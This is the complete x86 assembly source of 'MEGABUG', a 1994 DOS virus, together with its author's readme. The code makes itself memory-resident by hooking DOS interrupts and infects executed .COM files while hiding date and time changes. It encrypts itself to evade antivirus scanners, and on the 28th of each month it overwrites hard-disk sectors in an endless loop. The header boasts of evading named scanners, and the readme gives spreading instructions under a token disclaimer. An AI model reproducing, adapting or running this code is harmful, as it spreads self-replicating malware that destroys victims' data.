;V.C.M - VERY CREATIVE MOTHERFUCKERS - PRESENT :
;*********************************** MEGABUG ***********************************
;VIRUS NAME   = MEGABUG - The scilente KiLLER
;CODED BY     = HumpingMac/V.C.M (Who Else???) -1994
;RATINGS      = GOOD
;VIRUS ATTRIB = NOCI,R,GS,P,TS(Bla bla bla Polymorphic Time/Date Stealth)
;SIZE         = 546b
;POP UP       = 28th Of every Month
;TARGET       = DESTRUCTION what else???
;BUGS         = N/A
;AV-REPORT    = TBSCAN   - Unknow Virus (How Does He Do It????!!@!$$#@!%@)
;               TNTVIRUS - Halt When Saning It (Ha ha ha ha.....)
;               VA3      - No Detection.
;               SCAN     - No Way Dude......
;               VS       - No Detection.
                
CODE segment para

     Assume CS:CODE,DS:CODE,ES:CODE,SS:CODE
     Org 100h
     main proc
        call NxtLine
     NxtLine:Pop BP
         sub BP,103h; Offset FixUp
         mov di,Offset DECODEH;Start Of Poly Part
         add di,BP
         mov ax,CS:[Offset CyprVal+BP]
       Flow: Xor [DI],ax;DECODING ROUTIN....
         add DI,2
         mov DX,offset CyprVal+1
         add DX,BP
         cmp DI,DX
         jb flow
    DecodeH: push DS
         mov ax,0
         mov ds,ax     
         mov ax,1111h ;Installtion Check
         cmp 0:[4f0h],ax;BIOS INTER COMM. AREA(Everyone Except
         pop DS        
         je Return        ;viruses are afraid to touch
         Call Inst        ;it becuase data might be change!
    Return:call DAYCHECK ;heres one mean MAMAFUCKER!
        mov ax,cs
        mov es,ax
        mov di,100h
        lea si,[Offset BACKVAL+BP]
        mov cx,5
        rep MOVSB;Retore Old Instrouctions
        xor     ax,ax                     ;AX= 0
        mov     cx,ax                     ;BX= 0
        mov     bx,ax                     ;CX= 0
        mov     dx,ax                     ;DX= 0
        mov     di,ax                     ;DI= 0
        mov     si,ax                     ;SI= 0
        mov     sp,0FFFEh                 ;SP= 0
        mov     bp,100h                   ;BP= 100h (RETurn addr)
        push    bp                        ; Put on stack
        mov     bp,ax                     ;BP= 0
        ret                               ;Fake A Call
      main endp

     inst proc
      PUSH DS
      mov     ax,ds
      dec     ax
      mov     ds,ax                   ; ds->program MCB
      mov     ax,ds:[3]               ; get size word
      sub     ax,3dh                   ; reserve 40h paragraphs
      mov     bx,ax
      mov     ah,4Ah                  ; Shrink memory allocation
      int     21h
      mov     ah,48h                  ; Allocate 3Fh paragraphs
      mov     bx,3ch                  ; for the virus
      int     21h
      Je EndInst
      pop DS
      push DS
      push AX
      mov ax,3521h
      int 21h     ;Get Old Int 21h Vectors
      mov [Offset OldInt+BP],BX
      mov [Offset OldInt+BP+2],ES      
      pop ax
      dec AX
      mov DS,ax;Get Allocated Memory's MCB
      mov di,01
      mov Word Ptr[di],0800;Chain it to Dos So That the Memory Isn't Freed
      inc ax;Retore AX     
      POP DS
      mov es,ax     ;Transfer Virus To Allocated Memory
      mov si,BP;This Way NO antivirus can tell that
      add si,100h
      mov di,100h    ;that you go RES
      mov cx,Offset CyprVal-100h;Size???
      rep movsb
      push DS
      PUSH AX
      mov ax,3521h
      int 21h
      mov dx,bx
      mov ax,ES
      mov DS,ax
      mov ax,2591h
      int 21h;Interrupt 92h Now Supports All Int 21h Functions
      pop AX
      mov DS,ax
      mov dx,Offset Handler
      mov ax,2521h
      int 21h;Virus Is OnLine
      mov ax,0
      mov ds,ax
      mov 0:[4F0h],1111h;Installtion Stamp
      pop DS
 EndInst: ret
     inst endp

     Handler proc Far
         push ax;Push All Regs
         push bx
         push cx
         push dx
         push di
         push si
         push es
         push ds
         cmp ax,4B00h
         jne BACK2BACK
         Mov DI,dx
         call ChkIfCom
         jne BACK2BACK
         Call Infect
     BACK2BACK:pop ds
           pop es
           pop si
           pop di
           pop dx
           pop cx
           pop bx
           pop ax
       BACK:  db 0eah
       OldInt: dd ?
    Handler endp

    infect proc
        call ChkInfection
        Je ExitNClose

        mov ax,5700h
        mov bx,filehndl
        int 91h
        mov OldDate,DX
        mov OldTime,CX

        mov al,02h
        call MoveFilePtr
        mov FileSize,Ax
        cmp DX,0
            jne ExitNClose ;If File Is Greater Than 64k
              
        mov al,00h ;Set file pointer to the start of Victim file
        call MoveFilePtr
        
        mov Byte ptr [Offset Buf2],0e9h  ;Write JMP to EOF (E9 xx:xx
        mov ax,FileSize
        sub ax,3
        mov Word Ptr [Offset Buf2+1],ax
        mov Word Ptr [Offset Buf2+3],0FFFEh 

       mov ah,40h;Write DATA
       mov bx,filehndl
       mov cx,5
       mov dx,offset buf2
       int 91h
       jc EndInfect
       
       mov al,02h;moves file pointer to EOF
       call MoveFilePtr

       Call cypr               
       
       mov ax,5701h
       mov cx,OldTime
       mov dx,OldDate
       mov bx,FileHndl
       int 91h
ExitNClose:
       mov ah,3eh;Close File...
       mov bx,FileHndl 
       int 91h
       endinfect:retn
    infect endp

    MoveFilePtr proc
          mov ah,42h
          mov bx,FileHndl
          mov cx,0000
          mov dx,0000
          int 91h
          retn
    MoveFilePtr Endp
    ChkIfCom Proc
      Looper :inc DI
          mov ch,2eh
          cmp [di],ch;DOT ascii code
          jne looper
          inc DI
          mov cx,"OC"
          cmp ds:[di],cx
          jne ExitChk
          mov ch,"M"
          cmp ds:[DI+2],CH
      ExitChk:retn
     ChkIfCom Endp

     ChkInfection Proc;Checks If The File Is Infected
        mov ax,3d02h;-If Offset 3 = 0FFFEh
        int 91h;Open The File........
        mov CS:[Offset FileHndl],ax
        mov ax,CS
        mov DS,AX

        mov ah,3fh
        mov bx,FileHndl
        mov cx,5
        mov dx,Offset BACKVAL
        int 91h
        cmp Word Ptr [BACKVAL+3],0FFFEh
        retn
     ChkInfection Endp
     
     Cypr Proc;Slow But Small
      mov DI,100h
      mov ax,Word Ptr[Offset BACKVAL+1]
      mov CyprVal,ax
   Loop1: mov Ax,[DI]
      cmp DI,Offset DECODEH
      jb SkipXor
      Xor Ax,CyprVal
 SkipXor: mov Word Ptr[Offset Buf2],Ax
      call Writew
      add DI,2
      cmp DI,Offset CyprVal
      jb Loop1
      mov Ax,[DI]
      mov Word Ptr[Offset Buf2],ax
      call WriteW
      ret
     Cypr Endp

     Writew Proc;Writes 1 Word to File
       mov ah,40h
       mov dx,Offset Buf2
       mov cx,2
       mov bx,FileHndl
       int 91h
       retn
     WriteW endp

     DAYCHECK PROC
    mov ah,2ah       ;
    int 21h          ; Dos to your service..
    cmp dl,28        ; Check if it's the forbidden night..
    je  REDEEMING    ; If yes, have a great fuck..
    ret              ; I know I know its for he's own good...

REDEEMING:                              ; PARTY TIME!
    cli                             ; Nobody can save'ya now!
    mov di,0000                     ;
  REFUCK:mov al,2                       ;Nail that drive C
     mov bx,0000                    ;shit full disk!
     mov cx,700                     ;Write 700!!! Sectors
     mov dx,di
     int 26h                        ;Call DOS for the Job
     add di,700                     ;Pointless yet, FUN!
     jmp REFUCK                     ;No IMAGE can save'ya now!

DAYCHECK endp


     OldDate   dw 0;Guess
     OldTime   dw 0;Guess
     FileSize  dw 0;Guess
     FileHndl  dw 0;Guess
     BACKVAL   db 0CDh,20h,00,00,00;Old Instruction Value Starts With INT 20h 
     BUF2      db 5 dup  (0);Temp Swap Buf
     VCMSt     db "V.C.M-MEGABUG";Change This n' Will Shoot Ya'!
     CyprVal   dw 0 ;Polymorohic Encpyred Value


CODE ends

end main

      MEGABUGv1.0 - The Silente KiLLER *HumpingMac*/*V.C.M*

GENERAL - Well This Is A Very Very Nice Virus Once An Infected
          Has Been EXEcuted It Goes RES. (No Warning)
          and Every EXEC .COM files IS Being Infected (Date/Time
          would not be changed)it doesn't infected one file twice
          and Because of his polymorphic Nature The Virus doesnt
          Look the same From File To File(No Patteran Detection)
          It Takes about 0.6k Of Memory And Doesn't Cuase Errors
INSTALLTION - Run MEGABUG.COM then Run The .COM Files that Ya'Wanna
              Infect - BE CAREFULL SOME PROGS RUN COMMAND.COM Before
              EXEC Then The COMMAND.COM Will Also Be Infected
              The Infected File Will Not Be Infected Twice An Has
              The Same Qualities As The First File.

              Have Fun.

AS ALWAYS IT's NOT MY RESPONSIBILITY IF YOU DECIDE TO RELEASE THIS VIRUS
IT's Iilegal AND NOT NICE(WRGAD) IT WAS ONLY CREATED FOR TEST AND FUN.

